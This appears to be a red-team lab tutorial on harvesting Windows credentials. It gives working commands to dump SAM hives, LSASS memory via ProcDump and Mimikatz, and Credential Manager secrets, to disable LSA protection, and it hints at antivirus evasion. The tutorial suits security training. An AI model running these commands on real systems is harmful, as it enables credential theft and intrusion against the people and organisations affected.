# Credentials Harvesting

Credential harvesting consists of techniques for obtaining credentials like login information, account names, 
and passwords. It is a technique of extracting credential information from a system in various locations such 
as clear-text files, registry, memory dumping, etc. 

As a red teamer, gaining access to legitimate credentials has benefits:

- It can give access to systems (Lateral Movement).
- It makes it harder to detect our actions.
- It provides the opportunity to create and manage accounts to help achieve the end goals of a red team 
engagement.

Learning Objectives

- Understand the method of extracting credentials from local windows (SAM database)
- Learn how to access Windows memory and dump clear-text passwords and authentication tickets locally and - 
remotely.
- Introduction to Windows Credentials Manager and how to extract credentials.
- Learn methods of extracting credentials for Domain Controller
- Enumerate the Local Administrator Password Solution (LAPS) feature.
- Introduction to AD attacks that lead to obtaining credentials.

### Credentials Harvesting

Credentials Harvesting is a term for gaining access to user and system credentials. It is a technique to look 
for or steal stored credentials, including network sniffing, where an attacker captures transmitted 
credentials. 

Credentials can be found in a variety of different forms, such as:

- Accounts details (usernames and passwords)
- Hashes that include NTLM hashes, etc.
- Authentication Tickets: Tickets Granting Ticket (TGT), Ticket Granting Server (TGS)
- Any information that helps login into a system (private keys, etc.)

Generally speaking, there are two types of credential harvesting: external and internal. External credential 
harvesting most likely involves phishing emails and other techniques to trick a user into entering his 
username and password. Obtaining credentials through the internal network uses different approaches.

### Credential Access

Credential access is where adversaries may find credentials in compromised systems and gain access to user 
credentials. It helps adversaries to reuse them or impersonate the identity of a user. This is an important 
step for lateral movement and accessing other resources such as other applications or systems. Obtaining 
legitimate user credentials is preferred rather than exploiting systems using CVEs.

For more information, you may visit the [MITRE ATT&CK framework (TA0006)](https://attack.mitre.org/tactics/TA0006/).

Credentials are stored insecurely in various locations in systems:

- Clear-text files
- Database files
- Memory
- Password managers
- Enterprise Vaults
- Active Directory
- Network Sniffing

**Clear-text Files**

Attackers may search a compromised machine for credentials in local or remote file systems. Clear-text files 
could include sensitive information created by a user, containing passwords, private keys, etc. The MITRE 
ATT&CK framework defines it as [Unsecured Credentials: Credentials In Files (T1552.001)](https://attack.mitre.org/techniques/T1552/001/).

The following are some of the types of clear-text files that an attacker may be interested in:

- Commands history
- Configuration files (Web App, FTP files, etc.)
- Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
- Backup files
- Shared files and folders
- Registry
- Source code 

As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a 
user profile in the following path:

`C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

It might be worth checking what users are working on or finding sensitive information. Another example would 
be finding interesting information. For example, the following command is to look for the "password" keyword 
in the Window registry.

Looking for the "password" Keyword in the Registry

```          
c:\Users\user> reg query HKLM /f password /t REG_SZ /s
#OR
C:\Users\user> reg query HKCU /f password /t REG_SZ /s
```

HKEY_LOCAL_MACHINE\SYSTEM\THM
    flag    REG_SZ    password: 7tyh4ckm3

**Database Files**

Applications utilize database files to read or write settings, configurations, or credentials. Database 
files are usually stored locally in Windows operating systems. These files are an excellent target to check 
and hunt for credentials.

**Password Managers**

A password manager is an application to store and manage users' login information for local and Internet 
websites and services. Since it deals with users' data, it must be stored securely to prevent unauthorized 
access. 

Examples of Password Manager applications:

- Built-in password managers (Windows)
- Third-party: KeePass, 1Password, LastPass

However, misconfiguration and security flaws are found in these applications that let adversaries access 
stored data. Various tools could be used during the enumeration stage to get sensitive data in password 
manager applications used by Internet browsers and desktop applications.

We will discuss how to access the Windows Credentials manager and extract passwords.

**Memory Dump**

The Operating system's memory is a rich source of sensitive information that belongs to the Windows OS, 
users, and other applications. Data gets loaded into memory at run time or during the execution. Thus, 
accessing memory is limited to administrator users who fully control the system.

The following are examples of memory stored sensitive data, including:

- Clear-text credentials
- Cached passwords
- AD Tickets

We will discuss how to get access to memory and extract clear-text passwords and authentication tickets.

**Active Directory**

Active Directory stores a lot of information related to users, groups, computers, etc. Thus, enumerating the 
Active Directory environment is one of the focuses of red team assessments. Active Directory has a solid 
design, but misconfiguration made by admins makes it vulnerable to various attacks shown in this room.

The following are some of the Active Directory misconfigurations that may leak users' credentials.

- Users' description: Administrators set a password in the description for new employees and leave it there, 
which makes the account vulnerable to unauthorized access. 
- Group Policy SYSVOL: Leaked encryption keys let attackers access administrator accounts. Check Task 8 for 
more information about the vulnerable version of SYSVOL.
- NTDS: Contains AD users' credentials, making it a target for attackers.
- AD Attacks: Misconfiguration makes AD vulnerable to various attacks, which we will discuss in Task 9.

**Network Sniffing**

Gaining initial access to a target network enables attackers to perform various network attacks against 
local computers, including the AD environment. The Man-In-the-Middle attack against network protocols lets 
the attacker create a rogue or spoof trusted resources within the network to steal authentication 
information such as NTLM hashes.

### Local Windows Credentials

In general, Windows operating system provides two types of user accounts: Local and Domain. Local users' 
details are stored locally within the Windows file system, while domain users' details are stored in the 
centralized Active Directory.

**Keystrokes**

A keylogger is a software or hardware device to monitor and log keyboard typing activities. Keyloggers were 
initially designed for legitimate purposes such as feedback for software development or parental control. 

However, they can be misused to steal data. As a red teamer, hunting for credentials through keyloggers in a 
busy and interactive environment is a good option. If we know a compromised target has a logged-in user, we 
can perform keylogging using tools like the Metasploit framework or others.

**Security Account Manager (SAM)**

The SAM is a Microsoft Windows database that contains local account information such as usernames and 
passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. 
Moreover, it can not be read and accessed by any users while the Windows operating system is running. 
However, there are various ways and attacks to dump the content of the SAM database. 

**Metasploit's HashDump**

The first method is using the built-in Metasploit Framework feature, hashdump, to get a copy of the content 
of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump 
copy hashes. For more information about hashdump, you can visit the [rapid7 blog](https://www.rapid7.com/blog/post/2010/01/01/safe-reliable-hash-dumping/).

```
meterpreter > getuid
Server username: THM\Administrator
meterpreter > hashdump
```

**Volume Shadow Copy Service**

The other approach uses the Microsoft Volume shadow copy service, which helps perform a volume backup while 
applications read/write on volumes. You can visit the [Microsoft documentation page](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) for more information 
about the service.

More specifically, we will be using wmic to create a shadow volume copy. This has to be done through the 
command prompt with administrator privileges as follows,

1. Run cmd.exe prompt with administrator privileges.
2. Execute the wmic command to create a copy shadow of C: drive
3. Verify the creation from step 2 is available.
4. Copy the SAM database from the volume we created in step 2

Run cmd.exe with administrator privileges, then execute the following wmic command:

```
C:\Windows\system32>wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";
};
```

Use vssadmin, the Volume Shadow Copy Service administrative command-line tool, to list and confirm that we 
have a shadow copy of the C: volume:

```
C:\Windows\system32>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {57531135-fc85-4026-b4c5-f63a0b6850e9}
   Contained 1 shadow copies at creation time: 7/19/2023 11:15:09 AM
      Shadow Copy ID: {77ca7055-5e26-48ea-82a0-7da4a910c36e}
         Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Creds-Harvesting-AD.thm.red
         Service Machine: Creds-Harvesting-AD.thm.red
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
```

The output shows that we have successfully created a shadow copy volume of (C:) with the following path: 
`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1. `

As mentioned previously, the SAM database is encrypted either with RC4 or AES encryption algorithms. In 
order to decrypt it, we need a decryption key which is also stored in the files system in 
`c:\Windows\System32\Config\system`.

Copy both files (sam and system) from the shadow copy volume we generated to the desktop:

```           
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
        1 file(s) copied.

C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.
```

Copy the files to the attacking machine, and decrypt the sam file using `secretsdump.py`, one of the 
Impacket tools:

`impacket-secretsdump -sam sam -system system LOCAL`

**Registry Hives**

Another possible method for dumping the SAM database content is through the Windows Registry. Windows 
registry also stores a copy of some of the SAM database contents to be used by Windows services. Luckily, we 
can save the value of the Windows registry using the reg.exe tool. As previously mentioned, we need two 
files to decrypt the SAM database's content.

Run from an Administrator command prompt:

```
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.
```

Decrypt it using `secretsdump.py`, one of the Impacket tools.

`impacket-secretsdump -sam sam-reg -system system-reg LOCAL`

Note that we used the SAM and System files that we extracted from Windows Registry. 

Parameters

- -sam argument is to specify the path for the dumped sam file from the Windows machine
- -system argument is for a path for the system file
- LOCAL argument to decrypt the Local SAM file as this tool handles other types of decryption 

Note if we compare the output against the NTLM hashes we got from Metasploit's Hashdump, the result is 
different. The reason is the other accounts belong to Active Directory, and their information is not stored 
in the System file we have dumped. To Decrypt them, we need to dump the SECURITY file from the Windows file, 
which contains the required files to decrypt Active Directory accounts.

Once we obtain NTLM hashes, we can try to crack them using Hashcat if they are guessable, or we can use 
different techniques to impersonate users using the hashes.

### Local Security Authority Subsystem Service (LSASS)

**What is the LSASS?**

Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system 
security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, 
and Kerberos tickets.

Windows system stores credentials in the LSASS process to enable users to access network resources, such as 
file shares, SharePoint sites, and other network services, without entering credentials every time a user 
connects.

The LSASS process is a juicy target for red teamers because it stores sensitive information about user 
accounts. The LSASS is commonly abused to dump credentials to either escalate privileges, steal data, or 
move laterally. Luckily for us, if we have administrator privileges, we can dump the process memory of 
LSASS.

Windows system allows us to create a dump file, a snapshot of a given process. This could be done either 
with the Desktop access (GUI) or the command prompt. This attack is defined in the MITRE ATT&CK framework as 
["OS Credential Dumping: LSASS Memory (T1003)"](https://attack.mitre.org/techniques/T1003/001/).

**Graphic User Interface (GUI)**

To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the 
required process, right-click on it, and select "Create dump file".

Once the dumping process is finished, a pop-up message will show containing the path of the dumped file. Now 
copy the file and transfer it to our attacking machine to extract NTLM hashes offline with `pypykatz.py`.

*Note: if we try this on the provided VM, you should get an error the first time this is run, until we fix 
the registry value in the Protected LSASS section later in this task.*

Copy the dumped process to the Mimikatz folder:

`copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Path\To\Mimikatz\lsass.DMP`

**Sysinternals Suite**

An alternative way to dump a process if a GUI is not available to us is by using ProcDump. ProcDump is a 
Sysinternals process dump utility that runs from the command prompt. The SysInternals Suite isn't installed 
by default on Windows systems

We can specify a running process, which in our case is lsass.exe, to be dumped as follows:

```           
c:\>c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[09:09:33] Dump 1 initiated: c:\Tools\Mimikatz\lsass_dump-1.dmp
[09:09:33] Dump 1 writing: Estimated dump file size is 162 MB.
[09:09:34] Dump 1 complete: 163 MB written in 0.4 seconds
[09:09:34] Dump count reached.
```

Note that the dump process is writing to disk. Dumping the LSASS process is a known technique used by 
adversaries. Thus, AV products may flag it as malicious. In the real world, you may be more creative and 
write code to encrypt or implement a method to bypass AV products.

**MimiKatz**

Mimikatz is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory 
using various techniques. Mimikatz is a post-exploitation tool that enables other useful attacks, such as 
pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. Mimikatz deals with operating system 
memory to access information. It requires administrator and system privileges in order to dump memory and 
extract credentials.

Remember that the LSASS process is running as a SYSTEM. Thus in order to access users' hashes, we need a 
system or local administrator permissions. Open the command prompt, run it as administrator, and run MimiKatz

```
C:\Tools\Mimikatz> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # 
```        

Before dumping the memory for cashed credentials and hashes, we need to enable the SeDebugPrivilege and 
check the current permissions for memory access. It can be done by executing privilege::debug command

```           
mimikatz # privilege::debug
Privilege '20' OK
```

Once the privileges are given, we can access the memory to dump all cached passwords and hashes from the 
lsass.exe process using sekurlsa::logonpasswords.

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 515377 (00000000:0007dd31)
Session           : RemoteInteractive from 3
User Name         : Administrator
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 6/3/2022 8:30:44 AM
SID               : S-1-5-21-1966530601-3185510712-10604624-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : THM
         * NTLM     : 98d3a787a80d08385cea7fb4aa2a4261
         * SHA1     : 64a137cb8178b7700e6cffa387f4240043192e72
         * DPAPI    : bc355c6ce366fdd4fd91b54260f9cf70
...
```

Mimikatz lists a lot of information about accounts and machines. If we check closely in the Primary section 
for Administrator users, we can see that we have an NTLM hash. 

*Note: To get users' hashes, a user (victim) must have logged in to a system, and the user's credentials 
have been cached.*

**Protected LSASS**

In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials 
from memory. This task will show how to disable the LSA protection and dump credentials from memory using 
Mimikatz. To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in 
`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` to 1.

The steps are similar to the previous section, which runs the Mimikatz execution file with admin privileges 
and enables the debug mode. If the LSA protection is enabled, we will get an error executing the 
"sekurlsa::logonpasswords" command.

```
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

The command returns a 0x00000005 error code message (Access Denied). Lucky for us, Mimikatz provides a 
mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by 
executing "!+" as follows,

```
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
```

*Note: If this fails with an isFileExist error, exit mimikatz, navigate to the Mimikatz directory and run 
the command again.*

Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:

```
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 528 -> 00/00 [0-0-0]
```       

Now, if we try to run the "sekurlsa::logonpasswords" command again, it will be executed successfully and 
show cached credentials in memory.

### Windows Credential Manager

**What is Credentials Manager?**

Credential Manager is a Windows feature that stores logon-sensitive information for websites, applications, 
and networks. It contains login credentials such as usernames, passwords, and internet addresses. There are 
four credential categories:

- Web credentials contain authentication details stored in Internet browsers or other applications.
- Windows credentials contain Windows authentication details, such as NTLM or Kerberos.
- Generic credentials contain basic authentication details, such as clear-text usernames and passwords.
- Certificate-based credentials: Athunticated details based on certifications.

Note that authentication details are stored on the user's folder and are not shared among Windows user 
accounts. However, they are cached in memory.

**Accessing Credential Manager**

We can access the Windows Credential Manager through GUI (Control Panel -> User Accounts -> Credential 
Manager) or the command prompt `vaultcmd` utility.

Let's start to enumerate if there are any stored credentials. First, we list the current windows vaults 
available in the Windows target:

```
C:\Users\Administrator>vaultcmd /list
Currently loaded vaults:
        Vault: Web Credentials
        Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

        Vault: Windows Credentials
        Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault
```

By default, Windows has two vaults, one for Web and the other one for Windows machine credentials. The above 
output confirms that we have the two default vaults.

Let's check if there are any stored credentials in the Web Credentials vault by running the `vaultcmd` 
command with `/listproperties`:

```
C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"
Vault Properties: Web Credentials
Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
Number of credentials: 1
Current protection method: DPAPI
```

The output shows that we have one stored credential in the specified vault. List more information about the 
stored credential:

```
C:\Users\Administrator>VaultCmd /listcreds:"Web Credentials"
Credentials in vault: Web Credentials

Credential schema: Windows Web Password Credential
Resource: internal-app.thm.red
Identity: THMUser Saved By: MSEdge
Hidden: No
Roaming: Yes
```

**Credential Dumping**

The VaultCmd is not able to show the password, but we can rely on other PowerShell Scripts such as 
[Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1).

Ensure to execute PowerShell with bypass policy to import it as a module:

```
powershell -ex bypass

PS > Import-Module Get-WebCredentials
PS > Get-WebCredentials

UserName  Resource             Password     Properties
--------  --------             --------     ----------
THMUser internal-app.thm.red Password! {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}

```

**RunAs**

An alternative method of taking advantage of stored credentials is by using RunAs. RunAs is a command-line 
built-in tool that allows running Windows applications or tools under different users' permissions. The 
RunAs tool has various command arguments that could be used in the Windows system.

The `/savecred` argument allows you to save the credentials of the user in Windows Credentials Manager 
(under the Windows Credentials section). So, the next time we execute as the same user, `runas` will not ask 
for a password.

Another way to enumerate stored credentials is by using `cmdkey`, which is a tool to create, delete, and 
display stored Windows credentials. By providing the `/list` argument, we can show all stored credentials, 
or we can specify the credential to display more details `/list:computername`

```
cmdkey /list


Currently stored credentials:

    Target: Domain:interactive=thm\thm-local
    Type: Domain Password
    User: thm\thm-local
```

The output shows that we have a domain password stored as the thm\thm-local user. Note that stored 
credentials could be for other servers too. Now let's use runas to execute Windows applications as the 
thm-local user:

```
C:\Users\thm>runas /savecred /user:THM.red\thm-local cmd.exe
Attempting to start cmd.exe as user "THM.red\thm-local" ...
```       

A new cmd.exe pops up with a command prompt ready to use. Now run the whoami command to confirm that we are 
running under the desired user.

**Mimikatz**

Mimikatz is a tool that can dump clear-text passwords stored in the Credential Manager from memory. The 
steps are similar to those shown in the previous section (Memory dump), but we can specify to show the 
credentials manager section only this time.

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman
```

The techniques discussed in this task also could be done through other tools such as Empire, Metasploit, etc.

### Domain Controller
